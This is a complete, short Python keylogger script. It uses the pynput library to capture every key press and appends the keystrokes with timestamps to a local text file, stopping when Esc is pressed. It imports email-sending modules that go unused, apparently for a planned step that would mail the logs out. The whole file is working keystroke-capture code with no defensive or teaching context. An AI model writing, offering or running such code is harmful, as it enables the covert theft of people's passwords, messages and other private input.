import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard

log_file = "key_presses.txt"
keys_pressed = "" 

def on_press(key):
    global keys_pressed
    try:
        keys_pressed += key.char  # regular key
        print(f"Key {key.char} pressed")
    except AttributeError:
        keys_pressed += f"[{key}]"  # special key
        print(f"Special key {key} pressed")

def on_release(key):
    global keys_pressed
    
    # Only write if something was typed
    if keys_pressed:
        with open(log_file, "a") as f:
            f.write(f"{keys_pressed} at {datetime.datetime.now()}\n")
        keys_pressed = ""  # reset after writing
    
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()